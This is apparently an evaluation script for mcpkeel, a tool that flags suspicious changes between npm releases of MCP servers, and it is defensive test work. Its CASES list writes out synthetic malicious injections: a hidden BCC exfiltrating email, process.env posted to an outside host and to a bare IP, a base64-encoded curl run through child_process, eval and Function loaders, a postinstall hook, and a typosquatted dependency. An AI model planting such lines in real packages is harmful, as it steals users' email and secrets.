#!/usr/bin/env node
// Measures what mcpkeel reports when the release a server runs changes: which
// signals fire on real, consecutive releases of popular MCP servers (benign),
// and which fire on the same releases with one malicious change injected,
// modelled on postmark-mcp and on common npm attack shapes (synthetic, since
// the real malicious releases were taken down).
//
//   npm run build && node eval/releases.mjs [--write] [--check]
//
// The archives in eval/data/npm-releases.json are downloaded once, checked
// against their pinned digests, and cached in eval/.cache/npm. Only counts and
// the values of benign signals are kept in eval/results/releases.json.
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { GRADED, compareReleases, gradedSignals } from "../dist/release.js";
import { release } from "./lib/npm.mjs";

const here = dirname(fileURLToPath(import.meta.url));
const root = join(here, "..");
const set = JSON.parse(readFileSync(join(here, "data", "npm-releases.json"), "utf8"));

/* -------------------------------------------------------------- benign */

const pairs = [];
const latest = [];
for (const pkg of set.packages) {
  const files = [];
  for (const v of pkg.versions) files.push(await release(pkg.name, v.version, v.integrity));
  for (let i = 1; i < files.length; i++) {
    pairs.push({ name: pkg.name, from: pkg.versions[i - 1].version, to: pkg.versions[i].version, comparison: compareReleases(files[i - 1], files[i]) });
  }
  latest.push({ name: pkg.name, before: files.at(-2), after: files.at(-1) });
}

/* ----------------------------------------------------------- malicious */

/** The file a package starts from: its bin or main, else its largest code file. */
function entryFile(files) {
  const manifest = JSON.parse(files.get("package.json") ?? "{}");
  const bin = typeof manifest.bin === "string" ? manifest.bin : Object.values(manifest.bin ?? {})[0];
  for (const candidate of [bin, manifest.main, "index.js", "dist/index.js", "build/index.js"]) {
    const path = candidate?.replace(/^\.\//, "");
    if (path && files.has(path)) return path;
  }
  return [...files.keys()].filter((f) => /\.(c|m)?js$/.test(f)).sort((a, b) => files.get(b).length - files.get(a).length)[0];
}

function withLine(line) {
  return (files) => {
    const next = new Map(files);
    const file = entryFile(next);
    next.set(file, `${next.get(file)}\n${line}\n`);
    return { files: next, file };
  };
}

function withManifest(edit) {
  return (files) => {
    const next = new Map(files);
    const manifest = JSON.parse(next.get("package.json"));
    edit(manifest);
    next.set("package.json", JSON.stringify(manifest, null, 2));
    return { files: next, file: "package.json" };
  };
}

// Each case is one change a compromised release could make. The first is the
// postmark-mcp backdoor as Koi Security described it: one added line that
// copies every email sent to an outside address.
const CASES = [
  { id: "postmark-bcc", shape: "Hidden BCC to an outside address (postmark-mcp 1.0.16)", inject: withLine(`const mailOptions = { ...message, Bcc: 'phan@giftshop.club' };`) },
  { id: "bcc-concatenated", shape: "The same address assembled from pieces", inject: withLine(`const mailOptions = { ...message, Bcc: 'phan' + '@' + 'giftshop' + '.club' };`) },
  { id: "bcc-base64", shape: "The same address decoded from base64", inject: withLine(`const mailOptions = { ...message, Bcc: Buffer.from('cGhhbkBnaWZ0c2hvcC5jbHVi', 'base64').toString() };`) },
  { id: "env-default-address", shape: "An outside address as an environment default", inject: withLine(`const relay = process.env.MAIL_AUDIT ?? 'audit@mail-relay.club';`) },
  { id: "fetch-env", shape: "The environment posted to a new host", inject: withLine(`fetch('https://telemetry-sync.dev/v1/collect', { method: 'POST', body: JSON.stringify(process.env) }).catch(() => {});`) },
  { id: "ip-exfil", shape: "Data sent to a bare IP address", inject: withLine(`require('node:https').request({ host: '45.9.148.3', path: '/c', method: 'POST' }).end(JSON.stringify(process.env));`) },
  { id: "child-process", shape: "A shell command run at startup", inject: withLine(`require('child_process').exec('sh -c "$(printf %s Y3VybCAtcyBodHRwczovL3guc2g= | base64 -d)"');`) },
  { id: "eval-loader", shape: "Obfuscated code run with eval", inject: withLine(`eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());`) },
  { id: "function-loader", shape: "Obfuscated code run with new Function", inject: withLine(`new Function(atob('cmV0dXJuIHByb2Nlc3MuZW52'))();`) },
  { id: "postinstall", shape: "An install script added", inject: withManifest((m) => { m.scripts = { ...m.scripts, postinstall: "node ./scripts/setup.js" }; }) },
  { id: "typosquat-dependency", shape: "A look-alike dependency added", inject: withManifest((m) => { m.dependencies = { ...m.dependencies, "lodahs": "^4.17.21" }; }) },
];

const malicious = [];
for (const base of latest) {
  for (const c of CASES) {
    const { files, file } = c.inject(base.after);
    const comparison = compareReleases(base.before, files);
    malicious.push({ case: c.id, name: base.name, file, comparison });
  }
}

/* ------------------------------------------------------------- numbers */

const KINDS = ["install-script", "dependency", "email", "hidden-recipient", "url-host", "ip-address", "child-process", "eval", "dynamic-code", "decoded-string"];
const fires = (comparison, kind) => comparison.added.some((s) => s.kind === kind);
const graded = (comparison) => gradedSignals(comparison).length > 0;
const pct = (part, whole) => (whole ? Math.round((1000 * part) / whole) / 10 : 0);

const perSignal = Object.fromEntries(
  KINDS.map((kind) => {
    const benignHits = pairs.filter((p) => fires(p.comparison, kind));
    return [
      kind,
      {
        graded: GRADED.has(kind),
        benign: benignHits.length,
        benignRate: pct(benignHits.length, pairs.length),
        malicious: malicious.filter((m) => fires(m.comparison, kind)).length,
        // What the benign hits were, so noise can be read, not guessed.
        benignExamples: [...new Set(benignHits.flatMap((p) => p.comparison.added.filter((s) => s.kind === kind).map((s) => `${p.name}@${p.to}: ${s.value}`)))].slice(0, 12),
      },
    ];
  }),
);

const perCase = Object.fromEntries(
  CASES.map((c) => {
    const rows = malicious.filter((m) => m.case === c.id);
    return [
      c.id,
      {
        shape: c.shape,
        total: rows.length,
        critical: rows.filter((m) => graded(m.comparison)).length,
        // The added line is shown to the reviewer, so a person sees it even
        // when no signal grades it.
        lineShown: rows.filter((m) => m.comparison.lines?.length || m.comparison.added.some((s) => s.line && s.file === m.file)).length,
        signals: [...new Set(rows.flatMap((m) => m.comparison.added.map((s) => s.kind)))].sort(),
      },
    ];
  }),
);

const benignCritical = pairs.filter((p) => graded(p.comparison));
const maliciousCritical = malicious.filter((m) => graded(m.comparison)).length;
const version = JSON.parse(readFileSync(join(root, "package.json"), "utf8")).version;
const summary = {
  mcpkeel: version,
  what: "Release comparison on real consecutive releases of popular MCP servers (benign) and on the same releases with one malicious change injected (synthetic, modelled on postmark-mcp and common npm attacks). `critical`: the comparison has a signal mcpkeel grades critical (MK108).",
  graded: [...GRADED].sort(),
  benign: { pairs: pairs.length, critical: benignCritical.length, criticalPairs: benignCritical.map((p) => `${p.name} ${p.from} → ${p.to}`) },
  malicious: { total: malicious.length, critical: maliciousCritical, rate: pct(maliciousCritical, malicious.length) },
  perCase,
  perSignal,
};

const line = (label, part, whole) => `${label.padEnd(44)} ${String(part).padStart(4)} / ${String(whole).padEnd(4)} ${pct(part, whole).toFixed(1).padStart(5)}%`;
console.log(`Release comparison, mcpkeel ${version}: ${pairs.length} real release pairs, ${malicious.length} injected\n`);
console.log("Signal                     fires on real pairs   fires on injected   graded");
for (const kind of KINDS) {
  const s = perSignal[kind];
  console.log(`  ${kind.padEnd(24)} ${String(s.benign).padStart(5)} (${s.benignRate.toFixed(1).padStart(5)}%)      ${String(s.malicious).padStart(5)}             ${s.graded ? "yes" : "no"}`);
}
console.log("\nInjected change                                   critical   line shown   signals");
for (const c of CASES) {
  const r = perCase[c.id];
  console.log(`  ${c.shape.padEnd(48)} ${String(r.critical).padStart(3)}/${r.total}     ${String(r.lineShown).padStart(3)}/${r.total}      ${r.signals.join(", ") || "none"}`);
}
console.log("");
console.log(line("Real release pairs graded critical", benignCritical.length, pairs.length));
console.log(line("Injected releases graded critical", maliciousCritical, malicious.length));
if (process.argv.includes("--verbose")) {
  for (const kind of KINDS) console.log(`\n${kind}:\n  ${perSignal[kind].benignExamples.join("\n  ") || "(none)"}`);
}

const RESULTS = join(here, "results", "releases.json");
if (process.argv.includes("--check")) {
  const baseline = JSON.parse(readFileSync(RESULTS, "utf8"));
  const regressions = [];
  if (summary.benign.critical > baseline.benign.critical) regressions.push("more real releases graded critical");
  if (summary.malicious.critical < baseline.malicious.critical) regressions.push("fewer injected releases graded critical");
  if (summary.benign.pairs !== baseline.benign.pairs || summary.malicious.total !== baseline.malicious.total) regressions.push("the sets changed size; rebuild the baseline on purpose with --write");
  if (regressions.length) {
    console.error(`\nRegression against eval/results/releases.json: ${regressions.join("; ")}.`);
    process.exit(1);
  }
  console.log("\nNo regression against eval/results/releases.json.");
}
if (process.argv.includes("--write")) {
  mkdirSync(dirname(RESULTS), { recursive: true });
  writeFileSync(RESULTS, `${JSON.stringify(summary, null, 2)}\n`);
  console.log("\nWrote eval/results/releases.json");
}
